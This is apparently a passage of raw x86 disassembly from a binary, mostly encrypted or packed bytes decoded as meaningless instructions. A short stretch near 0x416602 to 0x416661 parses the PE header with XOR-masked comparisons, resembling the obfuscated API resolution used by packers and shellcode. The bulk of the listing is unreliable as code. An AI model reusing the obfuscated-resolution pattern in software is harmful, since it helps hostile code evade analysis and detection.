  416026:	test   al,0xae
  416028:	pop    edx
  416029:	rol    BYTE PTR [ebx+ebx*4-0xeaabfe5],cl
  416030:	scas   eax,DWORD PTR es:[edi]
  416031:	pop    edx
  416032:	in     eax,dx
  416033:	jns    0x415fca
  416035:	int3   
  416036:	ret    0x4476
  416039:	cmp    BYTE PTR [edx+0x64],ch
  41603c:	jne    0x415fc7
  41603e:	mov    ds:0x89d10fcf,eax
  416043:	jb     0x416051
  416045:	(bad)
  416048:	lods   eax,DWORD PTR ds:[esi]
  416049:	mov    ebx,0xdc2d354b
  41604e:	or     DWORD PTR [ebx-0x59],0x28
  416052:	xchg   esi,eax
  416053:	mov    DWORD PTR [ecx-0x57],edi
  416056:	mov    ebp,0xa2834cea
  41605b:	and    al,0x13
  41605d:	xor    bh,BYTE PTR [esi-0xde5ed7d]
  416063:	push   edi
  416064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416065:	mov    ds:0x71dd5926,al
  41606a:	jno    0x416087
  41606c:	outs   dx,BYTE PTR ds:[esi]
  41606d:	pop    edi
  41606e:	push   esi
  41606f:	and    bh,BYTE PTR [eax]
  416071:	ds pop es
  416073:	mov    cl,0xe1
  416075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416076:	push   eax
  416077:	outs   dx,BYTE PTR ds:[esi]
  416078:	call   0xd0576079
  41607d:	adc    BYTE PTR [eax+edi*4-0x6642d4f3],0x85
  416085:	mov    BYTE PTR [ebx+esi*1+0x1b329827],ah
  41608c:	test   eax,0x4a687dfe
  416091:	mov    bl,0x9a
  416093:	int    0x34
  416095:	inc    edx
  416096:	cmp    esi,esi
  416098:	ss loopne 0x4160a2
  41609b:	mov    al,0x1a
  41609d:	mov    ch,0x17
  41609f:	mov    ebx,0x3b56a41c
  4160a4:	jae    0x4160da
  4160a6:	mov    edi,0x46028fef
  4160ab:	jb     0x4160bb
  4160ad:	inc    edi
  4160ae:	test   eax,0xd810eaa5
  4160b3:	inc    edx
  4160b4:	pop    ss
  4160b5:	rcr    DWORD PTR [esi+0x5ebfec71],1
  4160bb:	sahf   
  4160bc:	rcl    ecx,0xd9
  4160bf:	adc    BYTE PTR [edx-0x59438697],0xcc
  4160c6:	jge    0x416113
  4160c8:	sbb    BYTE PTR [eax],0xa5
  4160cb:	retf   0x3567
  4160ce:	test   eax,0x85aff6d8
  4160d3:	dec    ebx
  4160d4:	sbb    DWORD PTR [esi+0x47],edx
  4160d7:	xor    edx,DWORD PTR [ebp-0x324f0b0]
  4160dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160de:	xor    DWORD PTR [eax+0xb],0xa66022ba
  4160e5:	mov    al,BYTE PTR [edi]
  4160e7:	je     0x416112
  4160e9:	jge    0x416169
  4160eb:	nop
  4160ec:	and    eax,0xb675697f
  4160f1:	cwde   
  4160f2:	add    al,0x8a
  4160f4:	gs (bad) 
  4160f6:	cli    
  4160f7:	inc    edx
  4160f8:	push   ebx
  4160f9:	stos   DWORD PTR es:[edi],eax
  4160fa:	in     eax,0x60
  4160fc:	push   ss
  4160fd:	mov    esi,0xbf54fe28
  416102:	jne    0x41614c
  416104:	push   cs
  416105:	add    eax,0xbc9c31ad
  41610a:	dec    ebx
  41610b:	aad    0x32
  41610d:	push   cs
  41610e:	push   esi
  41610f:	je     0x4160de
  416111:	cmp    ebx,DWORD PTR [edi]
  416113:	(bad)  
  416114:	out    dx,eax
  416115:	push   ebx
  416116:	dec    edi
  416117:	cmp    eax,0xf7cc721b
  41611c:	push   ecx
  41611d:	cwde   
  41611e:	popf   
  41611f:	mov    edx,0xa6c4f62a
  416124:	dec    edx
  416125:	xchg   esi,eax
  416126:	inc    edx
  416127:	dec    edx
  416128:	inc    esp
  416129:	dec    ecx
  41612a:	push   edx
  41612b:	mov    ds:0x9573ab9f,eax
  416130:	cli    
  416131:	sub    esp,DWORD PTR [edi+0x5c0ee4ef]
  416137:	imul   ecx,esp,0x1fb9a444
  41613d:	and    al,0x4c
  41613f:	mov    DWORD PTR [edx-0x5b68e6e],edx
  416145:	mov    ecx,0xf4857bf6
  41614a:	hlt    
  41614b:	pop    esp
  41614c:	pushf  
  41614d:	or     BYTE PTR [esi],cl
  41614f:	cmp    BYTE PTR [esi],bl
  416151:	pop    ds
  416152:	call   0x389c:0xde7efb86
  416159:	pop    ss
  41615a:	lds    edi,FWORD PTR [edi+0x1b]
  41615d:	sbb    al,0xe7
  41615f:	ja     0x416106
  416161:	ins    BYTE PTR es:[edi],dx
  416162:	rcr    BYTE PTR [edx-0x67a45a4],1
  416168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416169:	jecxz  0x4161e1
  41616b:	or     DWORD PTR [ebx],esi
  41616d:	ret    0xa3f2
  416170:	test   al,0x5d
  416172:	sbb    eax,DWORD PTR ds:0x3d53a4c0
  416178:	(bad)  
  416179:	in     eax,dx
  41617a:	dec    edi
  41617b:	lods   al,BYTE PTR ds:[esi]
  41617c:	push   es
  41617d:	fdivr  QWORD PTR [ecx-0x62e2c539]
  416183:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416184:	les    edx,FWORD PTR [edx-0x6744a0ae]
  41618a:	into   
  41618b:	mov    dh,0x3d
  41618d:	ror    DWORD PTR [esi+0x6d],1
  416190:	pop    edx
  416191:	idiv   DWORD PTR fs:[ebx-0x4814560]
  416198:	mov    dl,0x73
  41619a:	cdq    
  41619b:	mov    bl,0x54
  41619d:	int3   
  41619e:	add    DWORD PTR [edi-0x4b],ebx
  4161a1:	xlat   BYTE PTR ds:[ebx]
  4161a2:	ins    DWORD PTR es:[edi],dx
  4161a3:	or     BYTE PTR [esi-0x61],al
  4161a6:	add    eax,0x5e70d002
  4161ab:	test   BYTE PTR [esp+edi*1+0x15a6e6ff],dl
  4161b2:	push   ecx
  4161b3:	mov    al,ds:0xd381d63f
  4161b8:	ins    BYTE PTR es:[edi],dx
  4161b9:	leave  
  4161ba:	popf   
  4161bb:	outs   dx,BYTE PTR ds:[esi]
  4161bc:	scas   eax,DWORD PTR es:[edi]
  4161bd:	(bad)  
  4161be:	xchg   esi,eax
  4161bf:	iret   
  4161c0:	push   edi
  4161c1:	push   ebp
  4161c2:	mov    dl,0xa3
  4161c4:	ja     0x4161d0
  4161c6:	mov    gs,WORD PTR [ebp-0x47]
  4161c9:	out    dx,eax
  4161ca:	shl    DWORD PTR [edi],1
  4161cc:	adc    dh,BYTE PTR [esi+0x7bf88883]
  4161d2:	jo     0x416194
  4161d4:	inc    esi
  4161d5:	mov    ah,0xc5
  4161d7:	mov    ecx,0x9c418a7d
  4161dc:	out    dx,al
  4161dd:	add    BYTE PTR [ebp+eiz*8-0x54d40311],dl
  4161e4:	imul   edx,DWORD PTR [esi-0x4e8202ff],0xffffffad
  4161eb:	sbb    edi,DWORD PTR [esp+ebx*8-0x65]
  4161ef:	mov    eax,ds:0x7668b64d
  4161f4:	in     eax,dx
  4161f5:	pop    es
  4161f6:	dec    ebp
  4161f7:	out    dx,al
  4161f8:	xchg   esp,eax
  4161f9:	sar    dh,cl
  4161fb:	mov    DWORD PTR [esi+0x21],edx
  4161fe:	popf   
  4161ff:	sti    
  416200:	ja     0x416259
  416202:	inc    ebp
  416203:	scas   al,BYTE PTR es:[edi]
  416204:	push   ecx
  416205:	cmp    bl,BYTE PTR [ebp+0x431180a8]
  41620b:	push   ecx
  41620c:	or     DWORD PTR [ecx+0x20f98b90],ebp
  416212:	and    DWORD PTR [esi+esi*4],0xffffffd2
  416216:	push   ecx
  416217:	fsub   QWORD PTR ds:0xa85a92c
  41621d:	nop
  41621e:	setb   dh
  416221:	sub    al,0xac
  416223:	test   eax,0x489ee6e5
  416228:	dec    ebx
  416229:	xchg   BYTE PTR [edi-0x61],ch
  41622c:	lods   al,BYTE PTR ds:[esi]
  41622d:	in     eax,dx
  41622e:	cmp    al,0x90
  416230:	push   es
  416231:	or     eax,0xcf73cd78
  416236:	fwait
  416237:	sub    al,0x55
  416239:	mov    al,ds:0x468f423f
  41623e:	ja     0x416293
  416240:	ds into 
  416242:	(bad)  
  416243:	ficom  WORD PTR [esi]
  416245:	xchg   edi,eax
  416246:	xor    DWORD PTR [edi],esi
  416248:	pop    ebp
  416249:	repz mov ah,0xff
  41624c:	test   eax,0xd4fe9d0d
  416251:	xchg   edx,eax
  416252:	mov    ds:0xa28b2e0d,al
  416257:	jmp    0xe3b1aedb
  41625c:	and    eax,0x219629e5
  416261:	push   ebx
  416262:	repz or al,0xab
  416265:	xor    BYTE PTR [esp+ebp*2-0x40fffa8c],bh
  41626c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41626d:	jae    0x416241
  41626f:	into   
  416270:	out    dx,eax
  416271:	or     ch,BYTE PTR [ecx]
  416273:	mov    esp,0xa32785e3
  416278:	sub    DWORD PTR [eax-0x4a],esi
  41627b:	hlt    
  41627c:	mov    DWORD PTR [esi],eax
  41627e:	std    
  41627f:	push   eax
  416280:	adc    al,BYTE PTR [eax-0x55]
  416283:	out    0xf3,al
  416285:	xor    eax,0x222b5ae6
  41628a:	mov    dh,0xc7
  41628c:	enter  0x4cb2,0x6e
  416290:	xor    DWORD PTR [edi-0x40],0x672d4030
  416297:	fild   DWORD PTR [ebx-0x8]
  41629a:	out    0xf3,al
  41629c:	push   ss
  41629d:	pop    ebx
  41629e:	pop    ebx
  41629f:	adc    ecx,esi
  4162a1:	mov    ds:0x1493a60,eax
  4162a6:	mov    edx,0xbfaa95a5
  4162ab:	aaa    
  4162ac:	leave  
  4162ad:	cs dec ebx
  4162af:	in     eax,0x25
  4162b1:	or     ah,ch
  4162b3:	xchg   edx,eax
  4162b4:	call   DWORD PTR [ebx+eiz*4]
  4162b7:	sahf   
  4162b8:	or     ebp,DWORD PTR [esi+0x4e]
  4162bb:	(bad)  
  4162bc:	std    
  4162bd:	fist   WORD PTR [esi]
  4162bf:	jp     0x4162d1
  4162c1:	daa    
  4162c2:	mov    ebp,0x1f58b6bd
  4162c7:	adc    ecx,0xffffffdf
  4162ca:	cdq    
  4162cb:	xchg   ebp,eax
  4162cc:	clc    
  4162cd:	jnp    0x4162e4
  4162cf:	pop    gs
  4162d1:	sub    al,0xff
  4162d3:	jmp    0x1b9d79d6
  4162d8:	sub    DWORD PTR [esi],ebx
  4162da:	in     eax,0xeb
  4162dc:	ret    0xd862
  4162df:	repnz add al,0x43
  4162e2:	mov    ebp,0xd6960f60
  4162e7:	cmp    BYTE PTR [ecx+0x71],0xa5
  4162eb:	jmp    0x93cada54
  4162f0:	fdivr  DWORD PTR [edi-0x54]
  4162f3:	xchg   edx,eax
  4162f4:	inc    eax
  4162f5:	rcr    BYTE PTR [ebp+0x6b],cl
  4162f8:	fdivr  st,st(5)
  4162fa:	or     dl,ch
  4162fc:	mov    WORD PTR [esi-0x62],?
  4162ff:	cmp    BYTE PTR [eax],dl
  416301:	add    ebx,DWORD PTR [edx+0x181b9c3b]
  416307:	stc    
  416308:	jg     0x416305
  41630a:	add    ebp,DWORD PTR [edx]
  41630c:	(bad)  
  41630d:	out    0xf9,eax
  41630f:	aaa    
  416310:	imul   ebp,esi,0xf1e1556d
  416316:	ins    BYTE PTR es:[edi],dx
  416317:	cmp    eax,DWORD PTR [esi]
  416319:	cmp    edi,eax
  41631b:	clc    
  41631c:	sbb    al,0xb9
  41631e:	adc    eax,DWORD PTR [ebp+0x1f]
  416321:	sub    esi,DWORD PTR [edi+0x35]
  416324:	sub    al,0xa7
  416326:	fsub   DWORD PTR ds:0x7b1f7892
  41632c:	mov    edx,0xe5e535e2
  416331:	xor    BYTE PTR [edi-0x132e30c0],ah
  416337:	mov    ds:0x12bb7a7a,eax
  41633c:	inc    ecx
  41633d:	rcr    DWORD PTR [edx],1
  41633f:	fdiv   QWORD PTR [edi]
  416341:	sub    edx,DWORD PTR [edi-0x22d06d24]
  416347:	push   0x1c13718d
  41634c:	mov    cl,BYTE PTR [eax-0x14f07139]
  416352:	les    esp,FWORD PTR [ebx+0x5b]
  416355:	jae    0x416398
  416357:	sti    
  416358:	mov    ecx,DWORD PTR [ebp+0x76]
  41635b:	loope  0x41635c
  41635d:	mov    ds:0x84b0d868,eax
  416362:	dec    esi
  416363:	ror    BYTE PTR [eax],1
  416365:	fst    QWORD PTR [esi+0x72]
  416368:	fstp   st(6)
  41636a:	mov    edi,0xbb767196
  41636f:	ss aad 0x19
  416372:	jae    0x416357
  416374:	div    DWORD PTR [bp+di+0x542b]
  416379:	or     eax,0xf154b81f
  41637e:	pop    esi
  41637f:	mov    bh,0x9
  416381:	pop    es
  416382:	jbe    0x416378
  416384:	cmp    DWORD PTR [ebx-0x787493f6],edx
  41638a:	pusha  
  41638b:	or     al,0xc8
  41638d:	sub    DWORD PTR [ecx],esp
  41638f:	repz cmc 
  416391:	mov    edi,0x5fe682f3
  416396:	adc    ecx,DWORD PTR [edi]
  416398:	out    dx,eax
  416399:	pop    ebx
  41639a:	mov    dh,0x4e
  41639c:	outs   dx,BYTE PTR ds:[esi]
  41639d:	push   esp
  41639e:	mov    ebp,0x4829d5c8
  4163a3:	popa   
  4163a4:	pop    ebx
  4163a5:	mov    ecx,0x10014059
  4163aa:	jns    0x416388
  4163ac:	mov    ds:0x12ac5bbd,eax
  4163b1:	jmp    0x84ee:0xa14765c8
  4163b8:	lock xlat BYTE PTR ds:[ebx]
  4163ba:	cmp    bh,BYTE PTR [eax+edx*4+0x7c467ca2]
  4163c1:	lods   al,BYTE PTR ds:[esi]
  4163c2:	icebp  
  4163c3:	imul   esi,DWORD PTR [ebx],0x2d9a9110
  4163c9:	mov    bl,0x26
  4163cb:	mov    ecx,esi
  4163cd:	add    ch,BYTE PTR [edi-0x24593f1c]
  4163d3:	call   0x31b0b1ff
  4163d8:	cli    
  4163d9:	fcmovnbe st,st(4)
  4163db:	push   esi
  4163dc:	pand   mm1,QWORD PTR [ebx]
  4163df:	xchg   DWORD PTR [edx],edx
  4163e1:	pop    eax
  4163e2:	jp     0x41644c
  4163e4:	gs mov bl,0x74
  4163e7:	dec    esi
  4163e8:	jl     0x4163d1
  4163ea:	(bad)
  4163ed:	scas   eax,DWORD PTR es:[edi]
  4163ee:	xor    al,0xeb
  4163f0:	icebp  
  4163f1:	dec    ecx
  4163f2:	cmp    BYTE PTR [ecx+0x79],dh
  4163f5:	mov    ds:0xeaba4c50,eax
  4163fa:	sbb    WORD PTR [ecx+0x1047e8fc],ax
  416401:	scas   al,BYTE PTR es:[edi]
  416402:	pop    edi
  416403:	clc    
  416404:	dec    edx
  416405:	mov    esi,0x6bee11db
  41640a:	rol    BYTE PTR [esi+0x2ffa1887],cl
  416410:	or     ch,bl
  416412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416413:	xor    eax,0xeda4c276
  416418:	cmp    ebp,0xb08cbcdd
  41641e:	out    dx,al
  41641f:	(bad)  
  416421:	xchg   DWORD PTR [edi-0x6b],edi
  416424:	rol    esp,cl
  416426:	xchg   ebp,eax
  416427:	aam    0x1
  416429:	or     bl,BYTE PTR [ecx+esi*1]
  41642c:	out    0xed,eax
  41642e:	push   ebp
  41642f:	arpl   di,ax
  416431:	pop    edx
  416432:	add    bh,BYTE PTR [ebx]
  416434:	inc    edx
  416435:	adc    eax,0x2153af27
  41643a:	lock xchg edx,eax
  41643c:	data16 jo 0x416490
  41643f:	out    dx,al
  416440:	inc    esi
  416441:	test   dh,ch
  416443:	adc    ebx,esi
  416445:	ins    BYTE PTR es:[edi],dx
  416446:	jne    0x4163cb
  416448:	(bad)
  41644e:	dec    edx
  41644f:	icebp  
  416450:	scas   eax,DWORD PTR es:[edi]
  416451:	ret    0x378c
  416454:	test   BYTE PTR ds:0xa7663e43,0xc5
  41645b:	mov    bl,0xfd
  41645d:	shl    esi,1
  41645f:	add    edx,DWORD PTR [edx]
  416461:	cli    
  416462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416463:	sbb    BYTE PTR [edx+0x4a61f6ff],al
  416469:	outs   dx,BYTE PTR ds:[esi]
  41646a:	pop    ecx
  41646b:	pop    eax
  41646c:	lock mov eax,cs
  41646f:	jge    0x4164cc
  416471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416472:	ror    dh,1
  416474:	inc    esp
  416475:	cmp    BYTE PTR [esi-0x27ed2d01],ah
  41647b:	pop    ebx
  41647c:	mov    bh,0xd9
  41647e:	fs inc ecx
  416480:	sub    eax,0xf66ede38
  416485:	sbb    BYTE PTR [edx],ah
  416487:	cdq    
  416488:	adc    eax,0xd6ddde9
  41648d:	cli    
  41648e:	xor    esp,DWORD PTR [eax-0x7c7c5520]
  416494:	int3   
  416495:	adc    al,dl
  416497:	xchg   ecx,eax
  416498:	mov    al,ds:0x35cf9fdd
  41649d:	and    DWORD PTR ds:0x465f471d,edi
  4164a3:	sbb    BYTE PTR [eax],0xd4
  4164a6:	mov    esi,0xa225b147
  4164ab:	leave  
  4164ac:	mov    esi,0xd074a4c3
  4164b1:	repnz scas al,BYTE PTR es:[edi]
  4164b3:	retf   
  4164b4:	int    0xeb
  4164b6:	xchg   edx,eax
  4164b7:	pop    ds
  4164b8:	adc    DWORD PTR [esi+0x79],edi
  4164bb:	pop    ds
  4164bc:	mov    dl,0x57
  4164be:	arpl   WORD PTR [edx-0x28e22baf],bx
  4164c4:	dec    ebx
  4164c5:	mov    DWORD PTR [edx],esp
  4164c7:	repnz sub eax,0x43b78772
  4164cd:	(bad)  [esi+0x66d1cdee]
  4164d3:	ret    
  4164d4:	lock cmp BYTE PTR [eax+0x57],bl
  4164d8:	hlt    
  4164d9:	rcl    BYTE PTR cs:[ecx+0x38],0x3a
  4164de:	mov    ch,0x70
  4164e0:	cmp    al,dh
  4164e2:	lahf   
  4164e3:	push   esp
  4164e4:	xchg   edx,eax
  4164e5:	rcr    DWORD PTR [ebx+0x4],cl
  4164e8:	out    dx,al
  4164e9:	dec    eax
  4164ea:	inc    edx
  4164eb:	jle    0x4164c7
  4164ed:	clc    
  4164ee:	sti    
  4164ef:	repz data16 mov fs,WORD PTR [eax]
  4164f3:	mov    ds:0x7060109e,al
  4164f8:	loop   0x4164be
  4164fa:	jmp    0x2dd58ca5
  4164ff:	sbb    dh,dh
  416501:	jbe    0x416545
  416503:	fist   DWORD PTR [esp+edx*8-0x30fc6217]
  41650a:	cmp    cl,BYTE PTR [ecx+0x6]
  41650d:	jo     0x416546
  41650f:	not    DWORD PTR [eax]
  416511:	iret   
  416512:	mov    ecx,0x99f3e779
  416517:	scas   eax,DWORD PTR es:[edi]
  416518:	aad    0x58
  41651a:	popa   
  41651b:	or     DWORD PTR [ecx+0xe2938ba],esi
  416521:	dec    BYTE PTR [edi+0x7b]
  416524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416525:	sub    eax,0x2061bd45
  41652a:	push   ebx
  41652b:	punpckhbw mm2,QWORD PTR [edx+ebp*4+0x64]
  416530:	mov    ebx,0x23f3802f
  416535:	leave  
  416536:	fistp  DWORD PTR [eax]
  416538:	dec    esp
  416539:	sbb    BYTE PTR [esi],ch
  41653b:	mov    esp,DWORD PTR [ecx+eax*1]
  41653e:	call   DWORD PTR [ebx]
  416540:	sub    ebx,DWORD PTR [ecx+0x54]
  416543:	mov    ds:0x10b233b5,eax
  416548:	or     al,0x77
  41654a:	sub    eax,ebp
  41654c:	jecxz  0x416560
  41654e:	mov    dl,0x29
  416550:	enter  0x5229,0x38
  416554:	mov    ah,BYTE PTR [ecx+0x7222e561]
  41655a:	cwde   
  41655b:	jae    0x41658b
  41655d:	sub    al,0xc3
  41655f:	sub    ecx,DWORD PTR [ebp+0x69]
  416562:	scas   al,BYTE PTR es:[edi]
  416563:	sub    edx,edi
  416565:	cmc    
  416566:	xchg   ch,dl
  416568:	fwait
  416569:	retf   
  41656a:	scas   al,BYTE PTR es:[edi]
  41656b:	sub    eax,0xe08d0907
  416570:	push   esp
  416571:	shl    DWORD PTR [esi+0xdc9adc9],0x40
  416578:	les    edi,FWORD PTR [eax-0x7e599594]
  41657e:	mov    bh,0xdc
  416580:	ret    
  416581:	xchg   edi,eax
  416582:	mov    WORD PTR [ebp-0x1fd4db6c],ax
  416589:	inc    edi
  41658a:	(bad)  
  41658b:	xor    cl,BYTE PTR fs:[edi+edi*4]
  41658f:	xchg   esp,eax
  416590:	dec    eax
  416591:	sub    DWORD PTR [edi+0x29449c42],ebx
  416597:	mov    dl,dl
  416599:	and    al,0x62
  41659b:	add    DWORD PTR [edi+0x2c2200dd],eax
  4165a1:	pop    ds
  4165a2:	pop    ss
  4165a3:	repz mov edi,0xef0e7cdf
  4165a9:	(bad)  
  4165aa:	das    
  4165ab:	and    ch,BYTE PTR [esi]
  4165ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165ae:	dec    ebp
  4165af:	push   ss
  4165b0:	and    ebp,DWORD PTR [eax-0x3d215551]
  4165b6:	xchg   esp,eax
  4165b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165b8:	add    eax,0x8e36ce6
  4165bd:	push   edi
  4165be:	inc    ecx
  4165bf:	test   DWORD PTR [esi+0x78],eax
  4165c2:	scas   al,BYTE PTR es:[edi]
  4165c3:	sub    al,0xad
  4165c5:	mov    al,0x2e
  4165c7:	jb     0x416550
  4165c9:	cli    
  4165ca:	add    al,0xf3
  4165cc:	aad    0x42
  4165ce:	repz sub ecx,ebp
  4165d1:	add    edi,DWORD PTR [ebx+edi*8+0xfdfaa39]
  4165d8:	dec    esi
  4165d9:	push   edx
  4165da:	out    dx,al
  4165db:	xchg   ecx,eax
  4165dc:	std    
  4165dd:	frstpm(287 only) 
  4165df:	or     DWORD PTR [eax-0x3bb32e74],0xffffffa2
  4165e6:	scas   eax,DWORD PTR es:[edi]
  4165e7:	lods   al,BYTE PTR ds:[esi]
  4165e8:	jb     0x4165d3
  4165ea:	xor    BYTE PTR [edx+0x6ec8fdaf],dh
  4165f0:	pop    ecx
  4165f1:	dec    esp
  4165f2:	mov    ds:0xdaeebf7e,eax
  4165f7:	fild   DWORD PTR [eax]
  4165f9:	jg     0x41660a
  4165fb:	test   DWORD PTR [edx],esp
  4165fd:	add    BYTE PTR [eax],al
  4165ff:	add    BYTE PTR [esi+0xf],ah
  416602:	mov    esi,0x3b4bbb38
  416607:	add    BYTE PTR [eax],al
  416609:	sub    di,bx
  41660c:	mov    ebx,0x8a85
  416611:	xor    di,bx
  416614:	mov    ebx,0x4f87
  416619:	cmp    di,bx
  41661c:	je     0x416632
  416622:	mov    edi,DWORD PTR [ebp-0x10]
  416625:	xor    edi,ecx
  416627:	mov    ebx,esi
  416629:	sub    ebx,edi
  41662b:	add    eax,ebx
  41662d:	jmp    0x41421e
  416632:	mov    esi,DWORD PTR [ebp-0x14]
  416635:	mov    esi,DWORD PTR [esi]
  416637:	mov    edi,DWORD PTR [eax+0x3c]
  41663a:	lea    esi,[edi+esi*8+0x78]
  41663e:	mov    esi,DWORD PTR [esi+eax*1]
  416641:	mov    DWORD PTR [ebp-0x8],esi
  416644:	mov    esi,DWORD PTR [ebp+0x8]
  416647:	xor    esi,ecx
  416649:	add    esi,edx
  41664b:	mov    DWORD PTR [ebp-0x14],esi
  41664e:	mov    esi,DWORD PTR [ebp+0x8]
  416651:	mov    edi,DWORD PTR [ebp-0x8]
  416654:	xor    esi,ecx
  416656:	add    esi,edx
  416658:	pop    ebx
  416659:	cmp    edi,esi
  41665b:	jne    0x41adf7
  416661:	jmp    0x418a20
  416666:	fnstenv [edx-0x73]
  416669:	xchg   ebp,eax
  41666a:	gs xchg ebp,eax
  41666c:	test   eax,0x7c0e640e
  416671:	sbb    dl,BYTE PTR [ebx]
  416673:	sub    BYTE PTR [edi+0x6123db5d],ch
  416679:	(bad)  
  41667a:	rcr    BYTE PTR [edi+0x62],0x62
  41667e:	jge    0x41664a
  416680:	push   ebx
  416681:	sub    BYTE PTR [edx],ch
  416683:	and    eax,0xe0d5c4bc
  416688:	adc    al,BYTE PTR [eax+0x790ba9b9]
  41668e:	inc    edx
  41668f:	fdivr  DWORD PTR [ecx+0xd]
  416692:	xchg   edi,eax
  416693:	or     edi,DWORD PTR [edx-0x64ac59c1]
  416699:	imul   edx,DWORD PTR [edi+0x574b40ac],0x5e
  4166a0:	dec    esi
  4166a1:	push   edx
  4166a2:	adc    eax,0x293584ae
  4166a7:	sub    ebp,DWORD PTR [ecx+eiz*8-0x3f]
  4166ab:	and    al,0x7e
  4166ad:	test   eax,0x56cc262b
  4166b2:	in     eax,0xe8
  4166b4:	les    esp,FWORD PTR [edi]
  4166b6:	je     0x41667c
  4166b8:	add    esp,DWORD PTR [ebp-0x61]
  4166bb:	out    dx,al
  4166bc:	sbb    al,0xeb
  4166be:	mov    ?,WORD PTR [ecx-0x9fe1ba7]
  4166c4:	xchg   ebx,eax
  4166c5:	pop    ss
  4166c6:	inc    edx
  4166c7:	xor    BYTE PTR fs:[ecx-0x5e29341e],0x25
  4166cf:	js     0x4166fc
  4166d1:	push   0x77495e94
  4166d6:	gs xchg ecx,eax
  4166d8:	mov    edx,0x8bf4c7e2
  4166dd:	sbb    eax,0xc3065593
  4166e2:	test   BYTE PTR [ebx+eiz*1-0x548402bd],0xc8
  4166ea:	sub    dl,BYTE PTR [ebx]
  4166ec:	ds mov edx,0x37772156
  4166f2:	pop    ebx
  4166f3:	loop   0x4166d6
  4166f5:	loope  0x41673a
  4166f7:	data16 fld DWORD PTR [ecx]
  4166fa:	or     eax,0x7c551d3f
  4166ff:	jmp    DWORD PTR [edx]
  416701:	adc    DWORD PTR [edx],ecx
  416703:	pop    es
  416704:	jl     0x4166f2
  416706:	iret   
  416707:	mov    bl,0x51
  416709:	dec    ecx
  41670a:	mov    BYTE PTR [ecx],0xc9
  41670d:	sub    eax,0xf622321e
  416712:	ja     0x4166f8
  416714:	jno    0x4166c4
  416716:	test   al,0xc
  416718:	rol    ah,1
  41671a:	mov    dl,0xf3
  41671c:	pop    eax
  41671d:	in     al,0x37
  41671f:	mov    al,0x76
  416721:	inc    esp
  416722:	fcomp  QWORD PTR [eax]
  416724:	or     bl,BYTE PTR [esi]
  416726:	mov    BYTE PTR [ebp+ebp*1-0x454700ed],ah
  41672d:	loopne 0x416766
  41672f:	cmp    ch,BYTE PTR [edx-0x80]
  416732:	out    dx,eax
  416733:	iret   
  416734:	leave  
  416735:	jle    0x41673d
  416737:	enter  0x88d,0x27
  41673b:	mov    edi,0xbc65d4c0
  416740:	(bad)  
  416741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416742:	mov    edx,0x14a4b39e
  416747:	cmp    eax,0xf9cd95eb
  41674c:	into   
  41674d:	pop    esp
  41674e:	lds    edi,FWORD PTR [edx]
  416750:	jnp    0x4166fc
  416752:	push   ds
  416753:	jge    0x41672d
  416755:	leave  
  416756:	push   0xfda2a059
  41675b:	cmp    dh,BYTE PTR [esp+edi*1-0x19aecfe9]
  416762:	scas   eax,DWORD PTR es:[edi]
  416763:	sub    DWORD PTR [edx],ecx
  416765:	leave  
  416766:	mov    dl,0xe3
  416768:	xchg   ecx,eax
  416769:	out    dx,eax
  41676a:	out    0x82,al
  41676c:	js     0x416739
  41676e:	jp     0x416709
  416770:	dec    edx
  416771:	loopne 0x416702
  416773:	add    ebx,DWORD PTR [edx]
  416775:	nop
  416776:	inc    esi
  416777:	lds    eax,FWORD PTR es:[ebx+0x6cfd1d8d]
  41677e:	test   dh,bh
  416780:	adc    ecx,DWORD PTR [ecx+0x7a]
  416783:	xchg   esi,eax
  416784:	(bad)  
  416785:	repnz cmp dl,BYTE PTR [ebx]
  416788:	ins    BYTE PTR es:[edi],dx
  416789:	ret    0xa667
  41678c:	xchg   ebp,eax
  41678d:	inc    esp
  41678e:	push   ebp
  41678f:	sahf   
  416790:	int3   
  416791:	(bad)  
  416793:	lahf   
  416794:	adc    eax,0x10cb71da
  416799:	cmp    BYTE PTR [edi],bl
  41679b:	push   eax
  41679c:	sub    DWORD PTR [edx+0xf],ebx
  41679f:	dec    ebp
  4167a0:	aad    0xf8
  4167a2:	das    
  4167a3:	or     DWORD PTR [edx+ebp*8-0x3a],ebx
  4167a7:	das    
  4167a8:	or     ah,BYTE PTR [ebp-0x3c]
  4167ab:	mov    ds:0x7fa84b2d,al
  4167b0:	test   eax,0xa63220d9
  4167b5:	pop    es
  4167b6:	xlat   BYTE PTR ds:[ebx]
  4167b7:	dec    esp
  4167b8:	adc    ch,ah
  4167ba:	shr    DWORD PTR ds:0x4aa95882,cl
  4167c0:	shr    BYTE PTR [ecx],1
  4167c2:	pop    ss
  4167c3:	xor    ch,bl
  4167c5:	ret    0x46f0
  4167c8:	sub    al,0x48
  4167ca:	scas   eax,DWORD PTR es:[edi]
  4167cb:	add    al,0x1c
  4167cd:	ins    DWORD PTR es:[edi],dx
  4167ce:	xchg   ah,ah
  4167d0:	and    eax,0x32a8570e
  4167d5:	mov    eax,0xd63c375c
  4167da:	test   BYTE PTR [ebx],ch
  4167dc:	jge    0x416840
  4167de:	sbb    BYTE PTR [edx+0x47],0xc5
  4167e2:	xchg   esp,eax
  4167e3:	cs loope 0x41685f
  4167e6:	jns    0x416826
  4167e8:	retf   
  4167e9:	push   ds
  4167ea:	push   edi
  4167eb:	scas   al,BYTE PTR es:[edi]
  4167ec:	jmp    0x1039d53b
  4167f1:	repz ss push es
  4167f4:	stc    
  4167f5:	mov    esi,0x9aa0084c
  4167fa:	sub    al,0xc5
  4167fc:	mov    al,ds:0xf73054e9
  416801:	dec    edi
  416802:	inc    eax
  416803:	inc    esp
  416804:	sub    ah,BYTE PTR [ebx+0x41]
  416807:	inc    edi
